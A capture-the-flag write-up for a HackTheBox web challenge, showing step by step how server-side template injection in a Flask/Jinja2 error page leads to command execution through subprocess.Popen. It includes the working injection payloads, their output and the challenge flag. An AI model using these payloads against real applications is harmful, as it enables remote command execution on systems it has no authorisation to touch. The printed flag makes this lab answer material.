### Templated
Can you exploit this simple mistake?

Category: Web<br>
Difficulty: Easy

---

#### Injection

We visit the challenge website and see that it's powered by Jinja2:

```
Site still under construction
Proudly powered by Flask/Jinja2
```

We visited the `/test` page, but it resulted in a 404 error, displaying the name of the failed page:

```
Error 404
The page 'test' could not be found
```

Since the website uses Jinja2 which uses `{{}}` to render expressions, we can inject our own expressions to be rendered. Visiting the `/{{1+1}}` endpoint shows that the page is injectable:

```
Error 404
The page '2' could not be found
```

#### Syscall

Since the endpoint is injectable, visiting the `/{{self.__dict__}}` page will render a dictionary that contains all the attributes of the TemplateReference object:

```
Error 404
The page '{'_TemplateReference__context': <Context {'range': <class 'range'>, ..., 'g': <flask.g of 'app'>} of None>}' could not be found
```

Next we can get get a list of classes that the `self` object inherits from by visiting `/{{ self.__class__.__mro__ }}`:

```
Error 404
The page '(<class 'jinja2.runtime.TemplateReference'>, <class 'object'>)' could not be found
```

Now we can access the object class by visiting `/{{ self.__class__.__mro__[1] }}`:

```
Error 404
The page '<class 'object'>' could not be found
```

We can get all of the object class's subclasses  by visiting `/{{self.__class__.__mro__[1].__subclasses__()}}`:

```
Error 404
The page '[<class 'type'>, ..., <class 'unicodedata.UCD'>]' could not be found
```

We can access the Popen class which is the 414th subproccess in the list by visiting `/{{self.__class__.__mro__[1].__subclasses__()[414]}}`:

```
Error 404
The page '<class 'subprocess.Popen'>' could not be found
```

We can use Popen to make Syscalls. For example we can visit `/{{self.__class__.__mro__[1].__subclasses__()[414](["cmd"],stdout=-1,stderr=-1).communicate()}}`:

```
Error 404
The page '(b'root\n', b'')' could not be found
```

---

#### Flag
> HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}

We can get the flag visiting `/{{self.__class__.__mro__[1].__subclasses__()[414](["cat","flag.txt"],stdout=-1,stderr=-1).communicate()}}`:

```
Error 404
The page '(b'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}\n', b'')' could not be found
```

---